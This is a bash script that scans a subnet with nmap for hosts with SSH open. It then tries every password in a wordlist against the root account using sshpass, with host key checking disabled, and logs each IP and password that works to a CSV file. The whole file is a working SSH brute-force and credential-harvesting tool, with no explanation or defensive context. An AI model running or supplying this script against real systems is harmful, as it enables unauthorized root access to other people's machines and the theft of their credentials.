#!/bin/bash

# IP range
ip_range="172.85.69.0/24"

# Password file
password_file="password.txt"

# Output file
output_file="ip_passwords.csv"

# Write the header to the CSV file
echo "IP,Password" > $output_file

# Scan the IP range
for ip in $(nmap -sn -PR -n $ip_range | grep report | awk '{print $5}'); do
    # Check if port 22 is open
    port_status=$(nmap -p 22 -n $ip | grep 22/tcp | awk '{print $2}')
    
    # If port 22 is open, try each password
    if [ "$port_status" == "open" ]; then
        while read password; do
            # Try to connect via SSH
            sshpass -p $password ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@$ip exit 2>/dev/null
            
            # If the connection was successful, write the IP and password to the CSV file
            if [ $? -eq 0 ]; then
                echo "$ip,$password" >> $output_file
                break
            fi
        done < $password_file
    fi
done